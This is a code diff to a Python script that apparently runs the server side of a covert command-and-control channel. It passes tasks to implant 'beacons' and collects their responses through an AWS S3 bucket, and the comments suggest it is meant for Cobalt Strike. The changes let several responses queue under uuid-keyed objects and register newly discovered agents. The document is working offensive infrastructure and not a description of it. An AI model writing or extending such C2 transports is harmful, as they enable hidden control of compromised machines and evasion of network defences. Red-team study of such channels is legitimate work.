@@ -1,6 +1,7 @@
 import boto3
 from botocore.exceptions import ClientError
 from time import sleep
+import uuid
 
 # CS-S3-Agent user credentials with full access to S3
 # Instead of hardcoding, probably should hard-code an encryption
@@ -17,17 +18,24 @@ def prepTransport():
 	return 0
 
 def sendData(data, beaconId):
-    keyName = "{}:{}".format(beaconId, taskKeyName)
+    keyName = "{}:{}:{}".format(beaconId, taskKeyName, str(uuid.uuid4()))
     s3.put_object(Body=data, Bucket=bucketName, Key=keyName)
 
 def retrieveData(beaconId):
     keyName = "{}:{}".format(beaconId, respKeyName)
     while True:
         try:
-            resp = s3.get_object(Bucket=bucketName, Key=keyName)
-            msg = resp['Body'].read()
-            s3.delete_object(Bucket=bucketName, Key=keyName)
-            return msg
+            resp = s3.list_objects(Bucket=bucketName)
+            objects = resp['Contents']
+            taskResponses = []
+            for obj in objects:
+                if keyName in obj['Key']:
+                    resp = s3.get_object(Bucket=bucketName, Key=obj['Key'])
+                    msg = resp['Body'].read()
+                    s3.delete_object(Bucket=bucketName, Key=obj['Key'])
+                    taskResponses.append(msg)
+            if taskResponses:
+                return taskResponses
         except ClientError as e:
             if e.response['Error']['Code'] == 'NoSuchKey':
                 sleep(5)
@@ -53,7 +61,7 @@ def fetchNewBeacons():
         # beacons = [obj.split(':')[1] for obj in objects if 'AGENT:' in obj['Key']]
         for obj in objects:
             if 'AGENT:' in obj['Key']:
-                beaconId = obj['Key'].split(':')[1] 
+                beaconId = obj['Key'].split(':')[1]
                 print '[ + ] Discovered new Agent in bucket: {}'.format(beaconId)
                 # Remove the beacon registration
                 s3.delete_object(Bucket=bucketName, Key=obj['Key'])
